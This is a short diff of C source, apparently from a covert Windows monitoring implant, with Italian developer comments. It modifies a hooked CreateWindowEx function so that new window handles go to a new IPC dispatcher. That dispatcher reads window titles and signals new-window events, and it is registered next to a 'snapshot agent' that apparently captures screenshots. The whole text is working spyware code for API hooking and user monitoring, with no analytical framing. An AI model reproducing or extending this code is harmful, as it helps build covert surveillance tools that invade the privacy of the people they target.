@@ -1,5 +1,4 @@
-
-#define CAPTURE_INTERVAL 10 // In secondi
+extern BOOL g_newwindow_created;
 
 typedef struct _snap_param_struct {
 	DWORD interval;
@@ -42,7 +41,7 @@ HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
 		return (HWND)ret_code;
 
 	if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
-		pData->pHM_IpcCliWrite(PM_SNAPSHOTAGENT, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
+		pData->pHM_IpcCliWrite(PM_ONNEWWINDOW_IPC, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
 			
 	return (HWND)ret_code;
 }
@@ -55,6 +54,18 @@ DWORD PM_CreateWindowEx_setup(HMServiceStruct *pData)
 	return 0;
 }
 
+// In realta' serve per l'evento on_new_window ma deve essere un dispatcher quindi l'ho lasciato qui
+// per motivi "storici"...lo so fa cagare...
+DWORD __stdcall PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
+{
+	char buff[1024];
+
+	buff[0] = NULL;
+	HM_SafeGetWindowTextA(*(HWND*)msg, buff, sizeof(buff));
+	if (buff[0])  // Solo se ha il titolo
+		g_newwindow_created = TRUE;
+	return 1;
+}
 
 DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 {
@@ -81,5 +92,6 @@ DWORD __stdcall PM_SnapShotInit(BYTE *conf_ptr, BOOL bStartFlag)
 void PM_SnapShotRegister()
 {
 	AM_MonitorRegister(PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
+	AM_MonitorRegister(PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
 	PM_SnapShotInit(NULL, FALSE);
 }
